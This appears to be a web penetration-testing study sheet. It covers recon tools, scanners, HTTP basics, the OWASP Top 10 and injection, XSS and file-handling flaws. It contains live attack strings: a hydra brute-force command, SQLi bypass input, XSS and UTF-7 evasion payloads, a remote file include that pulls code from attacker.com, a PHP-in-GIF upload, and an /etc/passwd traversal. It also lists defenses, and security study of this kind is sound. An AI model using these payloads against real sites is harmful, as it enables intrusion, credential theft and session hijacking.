# Web Security




## Steps of web exploitation:

1. Information Gathering

* creation of dictionary: with **cewl.rb**/

* download website: **wget -rck**, **httrack**:
```
$ wget -rck <TARGET-WEBSITE>
```
* identification of email accounts: with **theharverster**, **maltego**, **msfcli (metasploit)**.

* extract metadata: with **Metagoofil** and **FOCA**. It also can be done with googling qith ```site: www.url.com ext:pdf intitle:"Documents and settings"```.

* a search for other domains that are hosted on the same IP  (virtual host): with **revhosts**.



2. Automatic Testing (scanners)

* Tools: **Nikto**, **w3af**, **skipfish**, **Arachni**, **ZAP**/

* spidering: **GoLISMERO**.

* interesting files: search for robots.txt, gitignore, .svn, .listin, .dstore, etc. Tool: **FOCA**.

* brute force folders and files: **dirb** and **dirbuster**.

* fuzzing to the various parameters, directories and others, in order to identify different types of vulnerabilities such as: XSS, SQLi, LDAPi, Xpathi, LFI, or RFI. Tool: **PowerFuzzer**, **Pipper** or ***Burpproxy***. A good fuzzy dictionary is **fuzzdb**.


3. Manual testing

* testing vulnerabilities: Burpproxy, ZAP, sitescope.

* identify components and plugins that have enabled the Website, as might be the following types of CMS (Content Managment Systems): Joomla Component, Wordpress plugin, Php-Nuke, drupal, Movable Type, Custom CMS, Blogsmith/Weblogs, Gawker CMS, TypePad, Blogger/Blogspot, Plone, Scoop, ExpressionEngine, LightCMS, GoodBarry, Traffik, Pligg, Concrete5, Typo3, Radiant CMS, Frog CMS, Silverstripe, Cushy CMS etc. Then find known vulnerabilities and **/** associated with it. Tools: **joomla Scan** or **cms-explorer**.

* headers, http methods, sessions, certifications: we could use any tool like a proxy or a simple telnet connection to the Website.
* fingerprinting to identify the architecture and configuration of the site: **httprint**.

* manipulation of parameters  to identify any errors and / or vulnerabilities. We can use any proxy to manipulate the requests. Alteration of the normal operation of the application by: single quotes, nulls values “%00”, carriage returns, random numbers, etc.

* analysis of Flash, Java, and other files: identify and download all flash files that exist on the Website. To do this, we could use the Google search: ```filetype:swf site:domain.com```. We could also use wget tool:

```
$ /wget -r -l1 -H -t1 -nd -N -nd -N -A.swf -erobots=off <WEBSITE> -i output_swf_files.txt

* Once we have identified and downloaded *.swf files, we must analyze the code, the functions (as *loadMovie*) variables in order to identify those that call and allow other types of vulnerabilities such as cross site scripting. Below shows some vulnerable functions:

```
_root.videourl = _root.videoload + '.swf';
video.loadMovie(_root.videourl);
getURL - payload. javascript:alert('css') getURL (clickTag, '_self')
	load* (in this case: loadMovie) - payload: as
function.getURL,javascript:alert('css')
	TextField.html - payload: <img src='javascript:alert("css")//.swf'>
```

* We could use tools such as **Deblaze** and **SWFIntruder**. We should also analyze the parameter AllowScriptAccess, Flash Parameter Pollution or sensitive APIs:

```
loadVariables, loadVariblesNum, MovieClip.loadVariables, loadVars.load, loadVars.sendAndLoad
XML.load, XML.sendAndLoad
URLLoader.load, URLStream.load
LocalConnection
ExternalInterface.addCallback
SharedObject.getLocal, SharedObject.getRemote
```

		* authentication system: the first thing is to determine if the website stored the credentials in the browser. This could be exploited with attacks on defaults accounts and dictionary attacks. The default accounts are: admin, administrator, root, system, user, default, name application. We can use **hydra** for this:

```
$ hydra -L users.txt -P pass.txt <WEBSTE> http-head/private
```


* [My list of common web vulnerabilities.](http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html)

---
## How do You Hack a Web Application

* Fuzz testing: what happens when unexpected data is sent into the application?
* Authentication testing: are authentication requirements always enforced?
* Authorization testing: can authorization be bypassed?
* Information disclosure: is information disclosed that might help compromise the application.

### Web Testing Methodology:

- Map the attack surface:
	* Crawl and inventory all requests and responses.
	* Follow all links.
	* Fill in every form with valid data.
	* Unauthenticated/Authenticated.
	* Unprivileged/Privileged.

- Identify key requests, functionality during crawl.
- Use logs as input for fuzzing GET & POST parameters.
- Use authenticated log to uncover unprotected resources.
- Use privileged log to uncover resources withou proper authorization.
- Analyze logs for other potential weakness.


## Folders:

### OS Command Injection


### SQLi

- Brute force password
- Timed SQLi
- Cookie force brute


### PHP Shells

- php primer
- xor
- exploits

### User ID
- cookie auth
- user id

### Other Resources

#### When we have a Website/IP Address:

- Try to add folders to the domain, such as http://csaw2014.website.com or http://key.website.com.

- We brute force the subdomains, for example, with [subbrute.py]. This tool performs multi-threaded DNS lookups to a configurable list of DNS resolvers, searching through a list of possible subdomains.

- Use the command ```dig``` or ```ping``` in Linux to find the IP  address of the website.

- *wgetting* the entire website with something like ```wget -e robots=off --tries=40 -r -H -l 4 <WEBSITE>```.

- Check the *robot.txt* file for hidden folders.

- Inspect the DOM using the browser's developer tools to look for HTML comments (plain view-source won't work when the content is loaded through Ajax).


-----

## URLs

#### Octal

- Example: http://017700000001 --> 127.0.0.1

- For example 206.191.158.50:

((206 * 256 + 191) * 256 + 158 ) * 256 + 50 = 3468664370.

Now, there is a further step that can make this address even more obscure. You can add to this dword number, any multiple of the quantity 4294967296 (2564) 


#### Great @

-Everything between "http://" and "@" is completely irrelevant

```
http://doesn'tmatter@www.google.org
http://!$^&*()_+`-={}|[]:;@www.google.com
```

- @ symbol can be represented by its hex code %40 
- dots are %2e



----

## HTTP

* HTTP is a stateless protocol based on a series of client requests and web server responses.

* HTTP requests and responses are comprised of Headers, followed by request or response body.


* HTTP requests must use a specific request method.

* HTTP responses contain a Status Code.

* HTTP is a plain-text protocol.

* The first line of a request is modified to include protocol version information and it's followed by zero or more name:value pairs (headers):
	- User-Agent: browser version information
	- Host: URL hostanme
	- Accept: supported MIME documents( such as text/plain or audio/MPEG)
	- Accept-Language: supported language codes
	- Referer: originating page for the request

* The headers are terminated with a single empty line, which may be followed by any payload the client wishes to pass to the server (the length should be specified with the Content-Length header). 

* The  payload is usually browser data, but there is no requirements.



### GET Method

* Passes all request data **within the URL QueryString**.

```
GET /<URL QUERY STRING> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WESITE>
<CRLF>
<CRLF>
```

### POST Method

* Passes all request data **within the HTTP request body**.

```
POST /<LINK> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WEBSITE>
Content-Lenght:16
<CRLF><CRLF>
name=John&type=2
```

### HTTP Status Codes

* 1xx - informational
* 2xx - success. Example: 200: 0K.
* 3xx - redirection. Example: 302: Location.
* 4xx - client error. Example: 403: Forbidden, 401: Unauthorized, 404: Not found.
* 5xx - server error. Example: 500: Internal Server Error.


### Session IDs

* HTTP protocol does not maintain state between requests. To maintain a state, must use a state tracking mechanism such as session identifier (session ID), which is passed within a request to associate requests with a session. 

* Session ID's can be passed in these places:
	- URL
	- Hidden Form Field
	- Cookie HTTP Header


### Cookies

* To initiate a session, server sends a Set-Cookie header, which begins with a NAME=VALUE pair, followed by zero or more semi-colon-separated attribute-value pairs (Domain, Path, Expires, Secure).

```
Set-Cookie: SID=472ndsw;expires=DATE;path=/;domain=SITE,HttpOnly
```

* Client sends Cookie header to server to continue session.


-----
## Tools

- [Burp Suite]
- [FireBug] in Firefox

----

## OWASP TOP 10

1. Injection
2. XSS
3. Broken Authentication and Session management
4. Insecure Direct Object Reference
5. CSRF
6. Security Misconfiguration
7. Insecure Cryptographic Storage
8. Failure to Restrict URL access
9. Insufficient Transport Layer Protection
10. Unvalidated Redirects and Forwards.


----
## Injection Flaws

* Happens when mixing Code and Input in the same context.
* Hostile input is parsed as code by the interpreter.

### SQL Injection

* For example an input text box for username and password. The server-side code can be:
```
String query = "SELECT user_id FROM user_data WHERE name = '  " + input.getValue("userID") + " ' and password = ' " + input.getValue("pwd") + " ' ";
```

* The SQL query interpreted by the SQL Server:

```
SELECT user_id FROM user_data  WHERE name='john' and password='password'
```

* However, if the attacker inputs **password' OR '1'='1**,  no password is required!

* See subfolder SQLi for more information.


----

## CSRF

* Identification and verification manual of CSRF can be done by checking in the website's forms (usually where most often find this vulnerability). 

* To check this, you will need to copy an original request (GET / POST) on a form and then make a change in the parameters and re-send the same request modified. If the server does not return an error, it can be considered that it is vulnerable to
CSRF. 

* To perform this task, we can use the tools **csrftester** or **burp** proxy.

----

## XSS

* Occurs when untrusted data is sent to the web browser without validating or encoding the content.

* Allows attackers to inject script code into the web browser under the vulnerable site's domain.
	- Steal session cookies and any other data in the DOM.
	- Deface website content or redirect to third party websites.
	- Exploit unpatched web browser or plugin.

* Types:
	- Reflected (Transient): payload from Request directly echoed back in Response.
	- Persistent: payload is stored and rendered back within another page.
	- DOM based: occurs Client-Side due to insecure JavaScript

### Persistent Payload

1. The Attacker upload to the server:
```
GET /VulnerablePage.jsp?p1=<script>evil();</script>
```

2. The victim request:
```
GET /VulnerablePage.jsp
```

3. But she/he gets:
```
<html><body>(...)evil();</script></body></html>
```

### Reflected Payload

1. The victim clicks in some malicious link:
```
<a href="http://website.com/Vuln.jsp?p1=%3cscript%3eevil();%3c/script%3e">Click here!</a>
```
2. The victim's GET request:
```
GET /Vuln.jsp?p1=<script>evil();</script>
```
3. Which returns:
```
<html><body>(...)<script>evil();</script>(..)
```


### XSS Shell & XSS Tunnel

*  XSS backdoor which allows an attacker to control a victim's browser by sending it commands.
* Attacker requests are proxied through XSS shell to perform requests as the victim.
* Enables attacker to bypass IP restrictions and all forms of authentication.

### XSS Identification and exploit techniques

* Reflected: pick your payloads, fuzz, and observe response. [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
* Persistent: include a unique string and grep responses.
* DOM based: analyze JavaScript for objects influenced by user:
	- document.URL
	- document.write
* Bypass weak application filters and output encoding: try different variants:
```
<IMG SRC=javascript:alert('XSS')>// no"or;
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>//no'
```
* Encode attack strings: URL, UTF-8, UTF-7
* Trick browser into using alternative character set (necessity of encoding consistence):
```
<?php 
header('Content-Type: text/html; charset=UTF-7'); 
$string = "<script>alert('XSS');</script>"; 
$string = mb_convert_encoding($string, 'UTF-7'); 
echo htmlentities($string); 
?>

### XSS Defenses

* Validate (whitelist)
* Convert HTML to HTML entity equivalent:
	- < can be represented by &lt; or &#60
	- > can be represented by &gt; or &#63
* Consider context when encoding (JavaScript, inline-HTML, URLs)


---

## Insecure File Handling

* Exploit include directive to execute file of attacker's choice.
* File inclusion is used in a variety of web programming frameworks.
* RFI more common in PHP, but Java and ASP/ASP.NET also susceptible to LFI:

```
<?php $page = $_GET["page"];
include($page); ?>
```
where page is ***http://www.target.com/vuln.php?page=http://www.attacker.com/rooted.php***.

* RFI depends on whether **allow_url_fopen** and **allow_url_include** in php.ini.

* Insecure file uploads: upload fails to restrict file types and files are web accessible.

* Attempt to upload arbitrary file types (.jsp, .aspx, .swf): manipulate Content-Type request header.

* Once uploaded, determine if uploaded content is web accessible. If it is executable on the server, it's game over. If it is downloadable, it can exploit users with malicious content.

* Try blended files:
```
GIF89a(...binary data...)
<?php phpinfo();  ?> (...
```

### Identifying File Handling Bugs

* Fuzz and grep response for file system related messages:
```
qr / ((could not|cannot|unable to) (open|find|access|read)|(path|file) not found) /i;
```

* Analyze requests for parameters passing paths and filenames.

* Try directory traversal, NULL  bytes, etc.
```
/FileDownload?file=reports/SomeReport.pdf
/FileDownload?file=../../etc/passwd%00.pdf
```



-----------------
[FireBug]: http://getfirebug.com/
[Burp Suite]: http://portswigger.net/burp/
[pngcheck]: http://www.libpng.org/pub/png/apps/pngcheck.html
[karmadecay]: http://karmadecay.com/
[tineye]:  https://www.tineye.com/
[images.google.com]: https://images.google.com/?gws_rd=ssl
[base64 decoding]: http://www.motobit.com/util/base64-decoder-encoder.asp
[subbrute.py]: https://github.com/SparkleHearts/subbrute
[pnginfo]: http://www.stillhq.com/pngtools/
[namechk]: http://namechk.com

